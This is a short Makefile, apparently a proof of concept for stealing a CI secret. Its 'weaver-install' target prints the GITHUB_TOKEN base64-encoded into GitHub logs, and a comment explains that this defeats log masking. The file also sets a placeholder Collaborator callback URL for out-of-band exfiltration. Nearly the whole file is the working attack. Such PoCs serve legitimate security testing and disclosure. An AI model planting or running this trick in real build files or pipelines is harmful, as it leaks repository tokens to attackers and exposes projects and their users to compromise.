# Ensure you use your actual Collaborator URL
COLLABORATOR_URL = http://YOUR_ID.oastify.com

weaver-install:
	@echo "--- Starting Exfiltration PoC ---"
	
	# 1. Print Base64 encoded token to GitHub logs
	# This bypasses the log masker because the string no longer matches the token
	@echo "Encoded Token for Log Verification:"
	@echo "$(GITHUB_TOKEN)" | base64


	@echo "--- PoC Complete ---"
